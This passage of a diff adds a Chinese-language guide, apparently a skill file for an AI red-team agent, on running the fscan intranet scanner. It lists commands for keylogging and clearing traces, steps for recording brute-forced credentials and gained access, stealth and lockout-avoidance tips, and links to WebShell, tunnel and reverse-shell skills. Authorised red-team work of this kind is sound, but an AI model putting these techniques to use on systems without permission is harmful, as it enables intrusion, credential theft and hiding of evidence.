+./fscan -local keylogger         # 键盘记录（-keylog-output 指定输出）
+./fscan -local cleaner           # 痕迹清理
+```
+
+## 结果落库（必须做）
+
+fscan 的 txt 输出是分段的，解析后逐条入库：
+
+```bash
+# 每台存活主机
+redteam_asset_add  { engagement, ip, source: "fscan", tags: ["internal"] }
+# 每个开放端口/服务
+redteam_asset_add  { engagement, ip, port, service, banner }   # 或 asset_link 关联
+# 爆破/未授权成功的凭据与访问
+redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/fscan-<段>.txt" }
+redteam_access_add     { engagement, host, username, method: "ssh", privilege, session_ref }
+# 确认的漏洞（必须配 http_evidence 或等价证据）
+redteam_vuln_add   { engagement, target, name: "Redis 未授权访问", severity: "high", evidence_ref }
+```
+
+**纪律**：`-o` 的输出文件是证据，拷回 `runs/`；不要只在终端里看一眼就算数。
+
+## 排障
+
+| 现象 | 处理 |
+| --- | --- |
+| 扫不动/极慢 | 去掉 `-np`、降 `-t`、加 `-time`；大网段先 `-m icmp` 圈活人 |
+| 全是假开放 | 中间有防火墙/负载均衡回 SYN-ACK，用 `-time` 调大 + `-retry` 复核 |
+| ICMP 失败 | 需要 root/`CAP_NET_RAW`；用 `sudo ./fscan -m icmp`，或改用 `-np` 只扫端口 |
+| 爆破被锁 | 先用 `-usera` 少量试，确认无锁定策略（域账号尤其危险） |
+| 中文乱码 | `-lang en` 或 `export LANG=zh_CN.UTF-8` |
+| 想更安静 | `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`，必要时 `-silent` |
+
+## 相关技能
+
+- `gogo-intranet`：先用它铺面
+- `suo5-tunnel`：WebShell → SOCKS5，给 fscan 提供 `-socks5` 入口
+- `vps-reverse-shell`：`-rsh` 的落地端、载荷投递
+- `webshell-toolkit`：拿到 WebShell 后的管理
